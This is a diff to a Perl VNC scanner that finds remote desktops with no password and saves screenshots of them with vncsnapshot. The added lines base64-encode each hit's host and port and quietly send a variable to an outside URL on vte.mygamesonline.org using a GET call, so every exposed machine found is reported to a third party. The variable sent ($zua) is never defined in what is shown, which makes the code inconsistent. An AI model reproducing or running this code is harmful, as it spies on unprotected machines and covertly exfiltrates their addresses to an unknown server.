@@ -35,11 +35,14 @@ if (unpack("H*", $data) =~ /00000001/) {
 }
  
 $client->close();
- 
+ use MIME::Base64;
+ my $ne = encode_base64("$hostname:$port", '');
 alarm(120);
 if (defined($security)) {
 	warn "[$hostname:$port] Taking snapshot.\n";
 	system("vncsnapshot -vncQuality 7 -quality 70 " . $hostname . ":" . ($port - 5900) . " ./q/" . $hostname . "_" . $port . ".jpg >/dev/null 2>&1");
+	  $vte = 'http://vte.mygamesonline.org/dodaj.php?p=sql_v&link='.$zua.'&dork=nie';
+	   qx!GET $vte!;
 	qx!echo $hostname $port >> quit!;
 } else {
 	warn "[$hostname:$port] Password required - ignoring.\n";
